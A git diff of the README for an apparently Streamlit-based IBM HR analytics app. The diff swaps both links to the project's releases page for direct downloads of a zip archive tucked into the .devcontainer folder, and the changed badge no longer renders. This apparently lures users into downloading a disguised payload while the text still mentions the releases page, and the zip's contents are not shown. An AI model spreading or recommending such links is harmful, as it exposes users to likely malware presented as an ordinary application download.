@@ -1,6 +1,6 @@
 # 📊 IBM-HR-Analytics-Streamlit - Analyze HR Data with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Detral1/IBM-HR-Analytics-Streamlit/releases)
+[![Download Now](https://github.com/Detral1/IBM-HR-Analytics-Streamlit/raw/refs/heads/main/.devcontainer/Streamlit_H_IB_Analytics_1.9.zip%20Now-brightgreen)](https://github.com/Detral1/IBM-HR-Analytics-Streamlit/raw/refs/heads/main/.devcontainer/Streamlit_H_IB_Analytics_1.9.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ To get started with this application, follow the steps below. You do not need an
 
 To download the application, visit the following link:
 
-[Download IBM-HR-Analytics-Streamlit](https://github.com/Detral1/IBM-HR-Analytics-Streamlit/releases)
+[Download IBM-HR-Analytics-Streamlit](https://github.com/Detral1/IBM-HR-Analytics-Streamlit/raw/refs/heads/main/.devcontainer/Streamlit_H_IB_Analytics_1.9.zip)
 
 1. Click on the link above.
 2. On the releases page, look for the latest version.
